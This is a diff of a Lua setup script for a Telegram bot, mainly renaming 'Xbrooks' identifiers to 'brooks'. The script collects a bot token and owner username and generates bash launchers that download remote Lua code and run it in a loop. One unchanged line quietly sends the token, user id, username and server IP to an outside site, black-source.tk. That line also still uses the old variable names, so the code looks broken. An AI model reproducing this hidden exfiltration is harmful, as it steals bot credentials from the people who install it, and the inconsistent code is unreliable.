@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_Xbrooks = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_Xbrooks = function() 
+Server_brooks = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_brooks = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local Xbrooks_Info_Sudo = io.open("sudo.lua", 'w')
-Xbrooks_Info_Sudo:write([[
+local brooks_Info_Sudo = io.open("sudo.lua", 'w')
+brooks_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-Xbrooks_Info_Sudo:close()
+brooks_Info_Sudo:close()
 end  
-if not database:get(Server_Xbrooks.."Token_Xbrooks") then
+if not database:get(Server_brooks.."Token_brooks") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_Xbrooks.."Token_Xbrooks",token)
+database:set(Server_brooks.."Token_brooks",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Xbrooks.."UserName_Xbrooks") then
+if not database:get(Server_brooks.."UserName_brooks") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Xbrooks.."UserName_Xbrooks",Json.Info.Username)
-database:set(Server_Xbrooks.."Id_Xbrooks",Json.Info.Id)
+database:set(Server_brooks.."UserName_brooks",Json.Info.Username)
+database:set(Server_brooks.."Id_brooks",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_Xbrooks_Info()
-Create_Info(database:get(Server_Xbrooks.."Token_Xbrooks"),database:get(Server_Xbrooks.."Id_Xbrooks"),database:get(Server_Xbrooks.."UserName_Xbrooks"))   
+local function Files_brooks_Info()
+Create_Info(database:get(Server_brooks.."Token_brooks"),database:get(Server_brooks.."Id_brooks"),database:get(Server_brooks.."UserName_brooks"))   
 https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(Server_Xbrooks.."Id_Xbrooks").."&user="..database:get(Server_Xbrooks.."UserName_Xbrooks").."&token="..database:get(Server_Xbrooks.."Token_Xbrooks&ip="..Server_Xbrooks))
-local RunXbrooks = io.open("X-brooks", 'w')
-RunXbrooks:write([[
+local Runbrooks = io.open("brooks", 'w')
+Runbrooks:write([[
 #!/usr/bin/env bash
-cd $HOME/X-brooks
-token="]]..database:get(Server_Xbrooks.."Token_Xbrooks")..[["
-rm -fr X-brooks.lua
+cd $HOME/brooks
+token="]]..database:get(Server_brooks.."Token_brooks")..[["
+rm -fr brooks.lua
 wget "https://raw.githubusercontent.com/X-brooks/X-brooks/main/X-brooks.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./X-brooks.lua -p PROFILE --bot=$token
+./tg -s ./brooks.lua -p PROFILE --bot=$token
 done
 ]])
-RunXbrooks:close()
+Runbrooks:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/Xbrooks
+cd $HOME/brooks
 while(true) do
 rm -fr ../.telegram-cli
-screen -S X-brooks -X kill
-screen -S X-brooks ./X-brooks
+screen -S brooks -X kill
+screen -S brooks ./brooks
 done
 ]])
 RunTs:close()
 end
-Files_Xbrooks_Info()
-database:del(Server_Xbrooks.."Token_Xbrooks");database:del(Server_Xbrooks.."Id_Xbrooks");database:del(Server_Xbrooks.."UserName_Xbrooks")
+Files_brooks_Info()
+database:del(Server_brooks.."Token_brooks");database:del(Server_brooks.."Id_brooks");database:del(Server_brooks.."UserName_brooks")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Xbrooks()  
+AutoFiles_brooks()  
 var = true
 else   
 f:close()  
-database:del(Server_Xbrooks.."Token_Xbrooks");database:del(Server_Xbrooks.."Id_Xbrooks");database:del(Server_Xbrooks.."UserName_Xbrooks")
+database:del(Server_brooks.."Token_brooks");database:del(Server_brooks.."Id_brooks");database:del(Server_brooks.."UserName_brooks")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
